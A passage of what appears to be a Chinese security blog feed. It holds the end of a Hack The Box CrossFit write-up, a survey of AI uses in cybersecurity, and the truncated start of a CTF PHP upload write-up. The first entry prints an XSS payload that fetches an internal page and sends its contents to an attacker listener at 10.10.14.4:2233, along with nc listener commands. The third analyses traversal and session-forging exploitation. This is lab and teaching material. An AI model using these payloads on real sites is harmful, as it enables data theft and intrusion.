class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">this</span>.readyState === <span class="number">4</span> &amp;&amp; <span class="built_in">this</span>.status === <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> xhr2 = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        xhr2.open(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;http://10.10.14.4:2233/&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        xhr2.send(<span class="built_in">this</span>.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://ftp.crossfit.htb/accounts/create&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure><p>像之前一样请求，不知为啥，这里卡了好久，服务端可以来我这获取 js代码，但是，nc就是接收不了，或者说是，nc接收到立刻退出，啥都没显示</p><p><img src="/img/htb-crossfit/image-20210814114833762.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210814114833762.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210814114833762"></p><p>然后通过 tcpdump 抓包，发现能正常显示….</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i utun2 host 10.10.14.4 and port 2233 -X</span><br></pre></td></tr></table></figure><p><img src="/img/htb-crossfit/image-20210814114929839.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210814114929839.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210814114929839"></p><p>麻了….</p><p>会不会是特殊字符影响了 nc 呢？payload2.js 改改</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">this</span>.readyState === <span class="number">4</span> &amp;&amp; <span class="built_in">this</span>.status === <span class="number">200</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> xhr2 = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        xhr2.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://10.10.14.4:2233/&quot;</span> + btoa(<span class="built_in">this</span>.responseText), <span class="literal">true</span>);</span><br><span class="line">        xhr2.send();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xhr.open(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;http://ftp.crossfit.htb/accounts/create&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">xhr.send();</span><br></pre></td></tr></table></figure><p>啊这… 不应该呀，那前面的 POST 怎么收到的？（虽然前面也会偶尔退出，但还是能收到的）</p><p><img src="/img/htb-crossfit/image-20210814115200480.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210814115200480.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210814115200480"></p><p>等等GET和POST… 难不成当POST请求体过大时，HTTP协议会变成分块传输？ 然后 <code>nc</code> 识别分块有误，所以就退出了？</p><p>尝试了一下持续监听，除非用^C或 ^D强制退出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvk 0.0.0.0 2233</span><br></pre></td></tr></table></figure><p>无果，还是没回显，有大佬知道解决方式的麻烦告知一下~</p><h3 id="2、xhr同会话问题"><a href="#2、xhr同会话问题" class="headerlink" title="2、xhr同会话问题"></a>2、xhr同会话问题</h3><p>设置 <code>withCredentials = true</code> 可以保证两个xhr请求他们在同一会话中，不是很清楚为啥…</p><p>根据浏览器的保护规则，跨域的时候我们创建的sessionId是不会被浏览器保存下来，也就是说，每一次的请求，服务器就会以为是一个新的人，而不是同一个人，当我们指定 <code>withCredentials = true</code> ，服务端会判断请求源是否在已配置的白名单中，如有，则返回 <code>Access-Control-Allow-Origin</code> ，浏览器看到服务端返回的源在可信范围内，则会保存sessionId，所以就保证了多个xhr请求在同一会话中。</p><h3 id="3、PHP指定形数，传入的不是指定的形参"><a href="#3、PHP指定形数，传入的不是指定的形参" class="headerlink" title="3、PHP指定形数，传入的不是指定的形参"></a>3、PHP指定形数，传入的不是指定的形参</h3><p>Command.php 代码：<a href="https://github.com/mikehaertl/php-shellcommand/releases/tag/1.6.0">https://github.com/mikehaertl/php-shellcommand/releases/tag/1.6.0</a></p><p>看了半天看不出来，传入一个 <code>$key</code> 和 <code>$escape</code> 应该有转义才对，把库拉下来，本机 debug 一下就破案了…</p><p>指定了<code>$escape=true</code> 这个参数，，但是传入的实际还是 <code>$value</code> ? 这么迷的，也就是说就算 <code>$escape=true</code>  ，<code>$escape</code> 还是没有被传入… 然后 <code>$value</code> 传入了，导致 <code>$key</code> 没有被转移</p><p><img src="/img/htb-crossfit/image-20210828154704568.png" class="lazyload" data-srcset="/img/htb-crossfit/image-20210828154704568.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210828154704568"></p><p>PHP5.6 和 PHP7.3都试过了，一样….</p><h3 id="4、好像没设置httponly-但为啥抓不到cookie"><a href="#4、好像没设置httponly-但为啥抓不到cookie" class="headerlink" title="4、好像没设置httponly 但为啥抓不到cookie"></a>4、好像没设置httponly 但为啥抓不到cookie</h3><p>GetShell后发现，本来就没有Cookie，只是管理员直接通过 127.0.0.1 去访问，我们外部没法直接访问</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>好像环境经常有毛病？比如lftp不知为啥连不上，有时候数据接收不会来，，之类的 的</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] <a href="https://www.sqlsec.com/2017/07/nmap.html">https://www.sqlsec.com/2017/07/nmap.html</a></p><p>[2] <a href="https://baike.baidu.com/item/SYN%E6%89%AB%E6%8F%8F/17658294">https://baike.baidu.com/item/SYN%E6%89%AB%E6%8F%8F/17658294</a></p><p>[3] <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies">https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies</a></p><p>[4] <a href="https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2019UNCTF">https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2019UNCTF</a></p><p>[5] <a href="https://wfuzz.readthedocs.io/en/latest/user/advanced.html#filter-language">https://wfuzz.readthedocs.io/en/latest/user/advanced.html#filter-language</a></p><p>[6] <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/open">https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/open</a></p><p>[7] <a href="https://en.wikipedia.org/wiki/Crypt_(C)">https://en.wikipedia.org/wiki/Crypt_(C)</a></p><p>[8] <a href="https://hashcat.net/wiki/doku.php?id=rule_based_attack">https://hashcat.net/wiki/doku.php?id=rule_based_attack</a></p><p>[9] <a href="https://snyk.io/vuln/SNYK-PHP-MIKEHAERTLPHPSHELLCOMMAND-538426">https://snyk.io/vuln/SNYK-PHP-MIKEHAERTLPHPSHELLCOMMAND-538426</a></p><p>[10] <a href="https://security.appspot.com/vsftpd/vsftpd_conf.html">https://security.appspot.com/vsftpd/vsftpd_conf.html</a></p><p>[11] <a href="https://linux.die.net/man/8/pam_shells">https://linux.die.net/man/8/pam_shells</a></p><p>[12] <a href="https://www.hackthebox.eu/home/machines/writeup/277">https://www.hackthebox.eu/home/machines/writeup/277</a></p><p><a href="https://0xdf.gitlab.io/2021/03/20/htb-crossfit.html">https://0xdf.gitlab.io/2021/03/20/htb-crossfit.html</a></p><p><a href="https://0xdedinfosec.github.io/posts/htb-crossfit/">https://0xdedinfosec.github.io/posts/htb-crossfit/</a></p>]]></content>
      
      
      <categories>
          
          <category> HTB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人工智能在网络安全领域的技术和应用</title>
      <link href="//p/2021/ai-in-cybersec/"/>
      <url>//p/2021/ai-in-cybersec/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>事情起因：老师让我帮忙找一些人工智能在网络安全领域涉及到的技术和应用，刚好来个我接触过的小总结~</p><p>然后在前沿网络安全领域的应用（3-5），主要是一个在读研同学提供的，他们的实验室主要是搞AI安全，感谢~</p><h2 id="一、用到的人工智能相关技术"><a href="#一、用到的人工智能相关技术" class="headerlink" title="一、用到的人工智能相关技术"></a>一、用到的人工智能相关技术</h2><p>用到的人工智能技术太多了，这里适当列举一些学习过的~</p><ul><li><a href="https://en.wikipedia.org/wiki/Generative_adversarial_network">生成对抗网络</a></li><li><a href="https://en.wikipedia.org/wiki/K-nearest_neighbors_algorithm">KNN</a></li><li><a href="https://en.wikipedia.org/wiki/Naive_Bayes_classifier">朴素贝叶斯</a></li><li><a href="https://en.wikipedia.org/wiki/Multilayer_perceptron">多层感知机</a></li><li><a href="https://en.wikipedia.org/wiki/Recurrent_neural_network">循环神经网络</a></li><li><a href="https://en.wikipedia.org/wiki/Convolutional_neural_network">卷积神经网络</a></li><li><a href="https://en.wikipedia.org/wiki/Long_short-term_memory">LSTM</a></li><li><a href="https://en.wikipedia.org/wiki/Tf%E2%80%93idf">TF-IDF</a></li><li><a href="https://en.wikipedia.org/wiki/Word2vec">词向量Word2vec</a></li><li><a href="https://en.wikipedia.org/wiki/Bag-of-words_model">词袋模型BOW</a></li><li><a href="https://en.wikipedia.org/wiki/Semantic_analysis_(machine_learning)">语义分析</a></li></ul><h2 id="二、人工智能在传统网络安全领域的应用"><a href="#二、人工智能在传统网络安全领域的应用" class="headerlink" title="二、人工智能在传统网络安全领域的应用"></a>二、人工智能在传统网络安全领域的应用</h2><h3 id="1、图形验证码识别"><a href="#1、图形验证码识别" class="headerlink" title="1、图形验证码识别"></a>1、图形验证码识别</h3><p>【应用背景简述】</p><p>攻击者在进行需要登录操作的Web攻击时，会使用脚本或工具结合字典对用户弱口令（许多用户为了便捷易记，通常使用 123456、password等小于8位且没有组合大小写数字特殊字符密码）进行爆破。此外，通常许多管理员只使用了 admin/admin 等弱口令组合，使得攻击者可以轻易进入网站后台获取大量数据，危害性极大。</p><p>网站为了用户的安全性，增加了图形验证码操作，这些验证码通常是增加了字符重叠变形模糊等噪声，传统的OCR技术不能直接提取（如图1-1所示），所以攻击者无法直接通过脚本或工具获得图形验证码的文本信息，从而防止攻击者恶意爆破弱口令。</p><p><img src="/img/ai-in-cybersec/image-20210807233339406.png" class="lazyload" data-srcset="/img/ai-in-cybersec/image-20210807233339406.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210807233339406"></p><center>图1-1 经过添加噪声的图形验证码</center><p>其实这本质上是一个从图形中提取文本信息问题，通过卷积、残差等神经网络在图像识别中都能取得了不错的效果，像图1-1中的验证码一般经过一定数据量的训练可以达到99%的准确率。</p><p>【相关开源项目 - 具体原理和过程可以看项目README】</p><p>1、基于 CNN/ResNet/DenseNet+GRU/LSTM+CTC/CrossEntropy 的图形验证码识别</p><p><a href="https://github.com/kerlomz/captcha_trainer">https://github.com/kerlomz/captcha_trainer</a></p><p>2、基于Keras 和深度卷积神经网络的图形验证码识别</p><p><a href="https://github.com/ypwhs/captcha_break">https://github.com/ypwhs/captcha_break</a></p><p> 【相关论文】</p><p>[1]田勇.基于机器学习的字符图像验证码识别研究[J].集宁师范学院学报,2021,43(02):87-90.</p><p>[2]汤战勇,田超雄,叶贵鑫,李婧,王薇,龚晓庆,陈晓江,房鼎益.一种基于条件生成式对抗网络的文本类验证码识别方法[J].计算机学报,2020,43(08):1572-1588.</p><h3 id="2、源代码安全审计"><a href="#2、源代码安全审计" class="headerlink" title="2、源代码安全审计"></a>2、源代码安全审计</h3><p>【应用背景简述】</p><p>代码审计是通过自动化分析工具和人工审查的组合审计方式，通过对源代码进行逐条分析，发现程序错误、安全漏洞和违反程序规范，最后提供代码修订措施和建议。如图2-1 kafka项目业务涉及到 OS 的 CLI 交互时，通常会拼接用户传入的参数，如果参数可控没有进行合理过滤会导致命令注入漏洞， 攻击者就可以通过拼接的方式注入攻击者想要执行的命令，从而控制目标计算机。但下图中，其实os.system 和 safe.system 都是存在命令注入的，传统的re匹配非常容易产生漏报和误报（当然还有很多单由规则匹配导致的误报漏报的场景）。实际场景中这些函数逻辑是十分复杂，代码量十分庞大的，单靠人工审计局限性也很明显。</p><p>因此一般结合一些NLP相关的，如词向量和语义分析等，来结合程序上下文语义来提高检测的精确率和召回率。</p><p><img src="/img/ai-in-cybersec/image-20210807233504356.png" class="lazyload" data-srcset="/img/ai-in-cybersec/image-20210807233504356.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210807233504356"></p><p>【相关开源项目】</p><p>暂无发现</p><p>【相关论文】</p><p>[1] A Review of Machine Learning in Software Vulnerability Research </p><p><a href="https://www.dst.defence.gov.au/sites/default/files/publications/documents/DST-Group-GD-0979.pdf">https://www.dst.defence.gov.au/sites/default/files/publications/documents/DST-Group-GD-0979.pdf</a></p><p>[2] 赵伟. 一种PHP代码审计技术的研究与实现[D].西安电子科技大学,2020.</p><p>[3] 陈璐璐. 基于机器学习的代码缺陷自动确认方法研究及实现[D].北京邮电大学,2020.</p><h3 id="3、WebShell检测"><a href="#3、WebShell检测" class="headerlink" title="3、WebShell检测"></a>3、WebShell检测</h3><p>【应用背景简述】</p><p>Webshell是指以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，攻击者一般通过向服务器植入恶意代码以实现控制Web服务器的目的。</p><p>一般的webshell可通过判断敏感函数（涉及到代码执行，如eval、system等）来进行判断，网站上是否存在Webshell，如图3-1右边所示。但一般有经验的攻击者会把Webshell经过混淆，和其他网页文件一样使用正常变量，接收参数，使用正常的函数，但人工很容易能看出是Webshell，通过传统的关键字匹配就无法识别。</p><p><img src="/img/ai-in-cybersec/image-20210807233513040.png" class="lazyload" data-srcset="/img/ai-in-cybersec/image-20210807233513040.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210807233513040"></p><center>图3-1 经过混淆Webshell和正常Webshell </center><p>【相关开源项目】</p><p>1、提取PHP执行中的opcode，采用 opcode词袋 + tf-idf 进行关键信息提取，采用朴素贝叶斯算法进行训练。</p><p><a href="https://github.com/hi-wenr0/mlcheckwebshell">https://github.com/hi-wenr0/mlcheckwebshell</a></p><p>补充：opcode 是汇编指令级代码，因为提取opcode更能还原恶意代码行为特征，而无需关心原有代码的混淆情况。但人直接看汇编代码，很难理解其上下文信息，很难判断一个文件是否为Webshell。 </p><p>【相关论文】</p><p>[1] 周子恒,李琳,赵叙,李凯.基于深度学习的Webshell恶意代码检测方法研究[J].电脑知识与技术,2021,17(07):180-183.</p><p>[2] 岳子涵,薛质,沈兴文,吴毅良.基于语义分析的PHP Webshell检测方法研究[J].通信技术,2020,53(12):3051-3055.</p><h3 id="4、恶意样本检测"><a href="#4、恶意样本检测" class="headerlink" title="4、恶意样本检测"></a>4、恶意样本检测</h3><p>【应用背景简述】</p><blockquote><p>引用自： </p><p>Huang, X., Ma, L., Yang, W. et al. A Method for Windows Malware Detection Based on Deep Learning. J Sign Process Syst 93, 265–273 (2021). <a href="https://doi.org/10.1007/s11265-020-01588-1">https://doi.org/10.1007/s11265-020-01588-1</a></p></blockquote><p>随着互联网在人们工作生活中的深入应用和快速发展，恶意软件的种类和数量与日俱增，给网络用户的信息安全、隐私安全等带来极大威胁。</p><p>最早的恶意软件检测技术是基于特征码匹配的检测，分析人员提取恶意软件中一或多段段具有标志性的代码序列作为“特征码”，加入到杀毒软件的特征库中，杀毒软件扫描时，将文件与特征库中的特征码一一匹配，若发现特征一致，则判定该文件为恶意。这种检测技术的好处是准确率较高、误报率较低，因为特征是由人工分析提取，所以不容易出现将正常文件错认为病毒的情况；但坏处是面对新出现的恶意软件力不从心，用户不受保护的空窗期较长，检测具有滞后性。</p><p>为弥补特征码的这种缺陷，又出现了基于启发式规则的检测和云检测。所谓启发式规则就是一些经验法则，将分析人员判定恶意文件的一些经验融入到杀毒软件中，例如一个文件加了一些不常见的“壳”，就可以认为这个文件比较可疑，这种检测技术可以应对部分新出现的恶意软件，但有可能产生较多误报。云检测则是将本地的病毒特征库移到了云端，从而消除了用户手动更新本地特征库的需要，使得空窗期大大缩短。</p><p>由于传统特征码匹配技术的滞后性和启发式扫描的高误报率，安全公司和研究人员把目光转向机器学习领域，希望借助机器学习检测恶意软件，实现一种既准确又及时的检测。</p><p>前人研究已将恶意文件可视化为图像，根据文件信息熵、字节频率值的相对大小将PE文件转化为RGB图，然后赋予危险的API调用赋予越醒目的颜色（恶意软件通常调用一些危险的API），再提取图像特征用传统机器学习算法进行分类。</p><h3 id="5、自动渗透测试工具"><a href="#5、自动渗透测试工具" class="headerlink" title="5、自动渗透测试工具"></a>5、自动渗透测试工具</h3><p>【应用背景简述】</p><p>现有的内网nday批量利用工具多为使用枚举式利用工具，通常在内网造成的动静较大，极易被EDR、态势感知等系统发现，这主要是因为Fofa、ZoomEye、云悉指纹等成熟的在线资产指纹探测工具无法在内网使用，从而无法得知目标主机的指纹信息。只能使用线下工具对目标进行指纹识别意味着指纹库较少，无法准确识别目标资产类型，使得只能针对每个nday进行枚举渗透。</p><p>强化学习技术通常可以用相对较少的数据训练出一个不错的拟合模型，在现有信息较少的情况下，如A2C、A3C算法，通过与环境的交互过程中通过学习策略以达成回报最大化，以实现更加精准的nday利用。</p><p><img src="/img/ai-in-cybersec/image-20210807233535696.png" class="lazyload" data-srcset="/img/ai-in-cybersec/image-20210807233535696.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210807233535696"></p><p>【相关开源项目】</p><p>1、利用Nmap进行信息收集（同时结合朴素贝叶斯算法识别传统指纹识别方法无法识别的一些特征）、MSF为nday利用框架、A3C强化学习算法实现更加精准的nday利用。</p><p><a href="https://github.com/13o-bbr-bbq/machine_learning_security/tree/master/DeepExploit">https://github.com/13o-bbr-bbq/machine_learning_security/tree/master/DeepExploit</a></p><h2 id="三、人工智能在前沿网络安全领域的应用"><a href="#三、人工智能在前沿网络安全领域的应用" class="headerlink" title="三、人工智能在前沿网络安全领域的应用"></a>三、人工智能在前沿网络安全领域的应用</h2><h3 id="1、人脸识别攻击"><a href="#1、人脸识别攻击" class="headerlink" title="1、人脸识别攻击"></a>1、人脸识别攻击</h3><p>【应用背景简述】</p><p>人脸识别作为生物指纹验证技术，现已在全国大范围普及开来，也作为公认作为一种安全、适应于支付场景的身份验证方式。人脸识别主要是通过深度学习模型通过提取人脸特征向量的方式进行，而生成对抗网络通过网络上应用到了的模型来生成一种肉眼不可见，但是对机器影响很大的噪声加载造恶这个模型的输入上面，这样的输入就可以导致模型给出错误的结果。如通过添加了恶意噪声来生成一个3D面具并3D打印从而骗过人脸识别算法，从而伪造他人身份。</p><p>【相关文章】</p><p>深度伪造(Deepfake)原理分析及实战</p><p><a href="https://www.anquanke.com/post/id/249632">https://www.anquanke.com/post/id/249632</a></p><p>涉及的论文和开源项目</p><p><a href="https://arxiv.org/pdf/2104.11280.pdf">https://arxiv.org/pdf/2104.11280.pdf</a></p><p><a href="https://github.com/AliaksandrSiarohin/first-order-model">https://github.com/AliaksandrSiarohin/first-order-model</a></p><p>【相关开源项目】</p><p>1、通过AdvHat算法对人脸识别系统进行黑盒攻击</p><p><a href="https://github.com/papermsucode/advhat">https://github.com/papermsucode/advhat</a></p><p>【相关论文】</p><p>[1] Yin, Bangjie, et al. “Adv-Makeup: A New Imperceptible and Transferable Attack on Face Recognition.” arXiv preprint arXiv:2105.03162 (2021).</p><h3 id="2、态势感知"><a href="#2、态势感知" class="headerlink" title="2、态势感知"></a>2、态势感知</h3><p>态势感知是一种基于环境的、动态、整体地洞悉安全风险的能力，是以安全大数据为基础，从全局视角提升对安全威胁的发现识别、理解分析、响应处置能力的一种方式，最终是为了决策与行动，是安全能力的落地。</p><p>态势感知虽然更多的利用的是大数据处理技术，因为其应用场景多为大企业内部安全、市级、省级甚至国家级安全层面对威胁风险的感知，数据量多为PB级及其以上。但如何从海量数据中自动分析潜在风险和应对未知威胁，也是个值得研究的问题，许多企业都把特征工程和神经网络技术应用与态势感知系统中，通过关联分析、联动响应和告警降噪等提高高级威胁与异常行为的精确度。</p><h3 id="3、成员推理攻击"><a href="#3、成员推理攻击" class="headerlink" title="3、成员推理攻击"></a>3、成员推理攻击</h3><p>近年来国家对用户隐私数据越发重视，数据泄漏事件也是层出不穷。深度学习模型通常需要大规模数据集进行训练。成员推理攻击根据一个模型的输出结果以及部分这个模型的参数来反推出包含隐私数据的数据成员，这样可以通过网络上已经应用到的网络模型来反推一些隐私数据。</p><h3 id="4、模型窃取攻击"><a href="#4、模型窃取攻击" class="headerlink" title="4、模型窃取攻击"></a>4、模型窃取攻击</h3><p>模型窃取攻击就是，比如说网络上应用到一种人工智能模型，那么攻击者就可以通过一部分这个模型的可获得的参数以及一定量的输入来够推断出这个模型的大部分参数，从而重构一个窃取模型来达到盗取专利的效果。</p><h3 id="5、数据投毒攻击"><a href="#5、数据投毒攻击" class="headerlink" title="5、数据投毒攻击"></a>5、数据投毒攻击</h3><p>人工智能模型的训练需要大量的数据，如果攻击者在训练数据里面做一些投毒处理，比如说把一个正确的标签，改成一个错误的标签，这个模型的训练结果就会出错。应用到网络安全方面，网络上可能一些模型需要用户这边传入数据，但是攻击者就会从用户传入的这些数据里面下毒，这样模型就会出现错误的情况。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>见相关开源项目和相关论文部分~</p>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人工智能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021红帽杯线下赛WEB upload题解</title>
      <link href="//p/2021/2021hmb-offline/"/>
      <url>//p/2021/2021hmb-offline/</url>
      
        <content type="html"><![CDATA[<p>虽然没参加，不过有个师傅跑过来讨论了，就顺便搞搞，第一题是opensns的nday，这里主要分析下第二题upload。还挺有意思，原来一开始想着用像 [CVE-2021-3129](<a href="https://tari.moe/2021/06/03/laravel8-debug-rce/">https://tari.moe/2021/06/03/laravel8-debug-rce/</a> 的方式写入可控的 session文件，结果 <code>h</code> 被过滤了。。</p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>源码</p><a class="button" href='/static/2021/07/31/upload.7z' title='upload.7z'><i class='fas fa-download'></i>upload.7z</a><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>关键文件有两个：index.php 和 info.php</p><p>info.php 主要是告诉我们，session存在 <code>/tmp</code> 目录下</p><p><img src="/img/2021hmb-offline/image-20210731013402633.png" class="lazyload" data-srcset="/img/2021hmb-offline/image-20210731013402633.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210731013402633"></p><p>index.php 内容较多，不过分析了一波，首先映入眼帘的是 <code>file_put_contents</code> 方法，参数没有进行过滤，存在目录穿越。那我们可以通过目录穿越写 session 文件了。</p><blockquote><p>PHP的session默认是以文件的形式进行存储，而且文件名是以 sess_ 开头的，后面的值为，为我们Cookie中 PHPSESSID=xxxxxxxxxxxxx 的 xxxxxxxxxxxxx。也就是我们以 PHPSESSID=xxxxxxxxxxxx 访问站点，PHP会在 /var/lib/tmp/php 之类的目录创新一个名为 sess_xxxxxxxxxxxxx 的文件，内容为序列化后的数据。</p></blockquote><p>但题目过滤了字符 <code>h</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(stristr(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>], <span class="string">&#x27;h&#x27;</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;no h!&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常来说，我们是没法目录穿越至存放 session 的路径的，毕竟有 <code>/php</code> 有 <code>h</code>，但，题目中 <code>session.save_path</code> 在 /tmp 目录，而且写入的内容没有限制，也就是说我们可以任意伪造 session 了。</p><p>75行处看似可以调用函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pathinfo</span> = <span class="keyword">array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]=&gt;<span class="variable">$_SESSION</span>[<span class="string">&#x27;files&#x27;</span>][<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]]);</span><br><span class="line">$&#123;<span class="variable">$_SESSION</span>[<span class="string">&#x27;func&#x27;</span>]&#125;(<span class="variable">$pathinfo</span>);</span><br></pre></td></tr></table></figure><p>仔细一分析… 这里 <code>$&#123;&#125;</code> 原来是一种<a href="https://stackoverflow.com/questions/5571624/what-does-mean-in-php-syntax">简单语法</a>，也就是先获取<code>$_SESSION[&#39;func&#39;]</code>的值，作为变量名，然后作为函数名去调用，当然可以构造 <code>$_SESSION[&#39;func&#39;]</code> 为 <code>_SESSION[&quot;paths&quot;]</code> 然后 <code>$_SESSION[&quot;paths&quot;]</code> 为 <code>system</code> 之类的，但 <code>$pathinfo</code> 是数组…. 暂时没发现啥方法是传入数组进行利用的。</p><p>所以另辟蹊径，发现56行 new 了一个对象</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$temp</span> = <span class="keyword">new</span> <span class="variable">$class</span>(<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure><p>下面有个直接输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="variable">$out</span>.<span 